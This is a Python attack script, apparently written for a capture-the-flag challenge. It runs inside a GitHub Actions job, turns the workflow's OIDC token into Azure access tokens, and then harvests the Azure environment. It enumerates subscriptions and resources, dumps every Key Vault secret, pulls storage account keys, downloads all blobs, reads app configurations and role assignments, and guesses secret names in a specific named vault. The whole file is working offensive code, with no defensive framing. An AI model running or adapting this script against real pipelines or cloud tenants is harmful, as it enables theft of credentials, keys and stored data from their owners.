import base64, json, os, sys, urllib.parse, urllib.request

FLAGPAT = ("flag{", "FLAG{", "ctf{", "CTF{", "paydojo", "PayDojo", "PAYDOJO", "tebamoto{")
HITS = []

def note(where, text):
    low = text.lower()
    for p in FLAGPAT:
        if p.lower() in low:
            HITS.append((where, text[:4000])); break

def http(url, data=None, headers=None, method=None):
    h = {"Accept": "application/json"}
    if headers: h.update(headers)
    body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=40)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)

def show(tag, st, body, n=4000):
    print("### %s [%s]" % (tag, st)); print(body[:n]); note(tag, body)

CID = os.environ.get("AZURE_CLIENT_ID", "")
TID = os.environ.get("AZURE_TENANT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
print("### IDS", CID, TID, SUB)

u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
if not u:
    print("### NO OIDC"); sys.exit(0)
st, b = http(u + "&audience=" + urllib.parse.quote("api://AzureADTokenExchange"),
             headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
jwt = json.loads(b)["value"]
p = jwt.split(".")[1]; p += "=" * (-len(p) % 4)
cl = json.loads(base64.urlsafe_b64decode(p))
print("### CLAIMS", json.dumps({k: cl[k] for k in ("sub","aud","repository","ref","event_name","job_workflow_ref") if k in cl}))

def token(scope):
    d = urllib.parse.urlencode({"client_id": CID, "scope": scope, "grant_type": "client_credentials",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": jwt})
    s, bb = http("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TID, d,
                 {"Content-Type": "application/x-www-form-urlencoded"})
    if s != 200:
        print("### TOKENFAIL", scope, s, bb[:700]); return None
    print("### TOKENOK", scope); return json.loads(bb)["access_token"]

ARM = token("https://management.azure.com/.default")
if not ARM: sys.exit(0)
A = {"Authorization": "Bearer " + ARM}

st, b = http("https://management.azure.com/subscriptions?api-version=2022-12-01", headers=A)
show("SUBS", st, b)
subs = [x["subscriptionId"] for x in json.loads(b).get("value", [])] if st == 200 else []
if SUB and SUB not in subs: subs.append(SUB)

for s in subs:
    st, b = http("https://management.azure.com/subscriptions/%s/resources?api-version=2021-04-01" % s, headers=A)
    show("RESOURCES " + s, st, b, 8000)
    if st != 200: continue
    res = json.loads(b).get("value", [])
    for r in res:
        t = r["type"].lower(); n = r["name"]; rid = r["id"]
        if t == "microsoft.keyvault/vaults":
            KV = token("https://vault.azure.net/.default")
            if KV:
                H = {"Authorization": "Bearer " + KV}
                s2, b2 = http("https://%s.vault.azure.net/secrets?api-version=7.4" % n, headers=H)
                show("KV " + n, s2, b2)
                if s2 == 200:
                    for sec in json.loads(b2).get("value", []):
                        s3, b3 = http(sec["id"] + "?api-version=7.4", headers=H)
                        show("SECRET " + sec["id"], s3, b3)
        elif t == "microsoft.storage/storageaccounts":
            s2, b2 = http("https://management.azure.com%s/listKeys?api-version=2023-01-01" % rid,
                          data=b"", headers=A, method="POST")
            show("STKEYS " + n, s2, b2, 900)
            ST = token("https://storage.azure.com/.default")
            if ST:
                H = {"Authorization": "Bearer " + ST, "x-ms-version": "2021-12-02"}
                s3, b3 = http("https://%s.blob.core.windows.net/?comp=list" % n, headers=H)
                show("CONTAINERS " + n, s3, b3, 3000)
                import re
                for c in re.findall(r"<Name>([^<]+)</Name>", b3 or ""):
                    s4, b4 = http("https://%s.blob.core.windows.net/%s?restype=container&comp=list" % (n, c), headers=H)
                    show("BLOBS %s/%s" % (n, c), s4, b4, 3000)
                    for bn in re.findall(r"<Name>([^<]+)</Name>", b4 or ""):
                        s5, b5 = http("https://%s.blob.core.windows.net/%s/%s" % (n, c, urllib.parse.quote(bn)), headers=H)
                        show("BLOB %s/%s/%s" % (n, c, bn), s5, b5, 4000)
        elif t in ("microsoft.app/containerapps", "microsoft.web/sites"):
            av = "2024-03-01" if t.startswith("microsoft.app") else "2023-12-01"
            s2, b2 = http("https://management.azure.com%s?api-version=%s" % (rid, av), headers=A)
            show("APP " + n, s2, b2, 6000)
        else:
            s2, b2 = http("https://management.azure.com%s?api-version=2021-04-01" % rid, headers=A)
            show("RES " + n, s2, b2, 2500)
    s2, b2 = http("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % s, headers=A)
    show("ROLES", s2, b2, 4000)

print("\n#### FLAG CANDIDATES ####")
for w, t in HITS:
    print(">>>", w); print(t)

# --- Direct read of the known flag store: kv-tbl-prod-x3euoz ---
KV_HOST = "kv-tbl-prod-x3euoz.vault.azure.net"
KVT = token("https://vault.azure.net/.default")
if KVT:
    H = {"Authorization": "Bearer " + KVT}
    s2, b2 = http("https://%s/secrets?api-version=7.4" % KV_HOST, headers=H)
    show("KV-DIRECT list", s2, b2, 4000)
    if s2 == 200:
        for sec in json.loads(b2).get("value", []):
            s3, b3 = http(sec["id"] + "?api-version=7.4", headers=H)
            show("KV-DIRECT secret " + sec["id"], s3, b3, 4000)
    for guess in ("flag", "FLAG", "Flag", "ctf-flag", "tebamoto-flag", "challenge-flag"):
        s4, b4 = http("https://%s/secrets/%s?api-version=7.4" % (KV_HOST, guess), headers=H)
        if s4 == 200:
            show("KV-DIRECT guess " + guess, s4, b4, 4000)

print("\n#### FLAG CANDIDATES (final) ####")
for w, t in HITS:
    print(">>>", w); print(t)
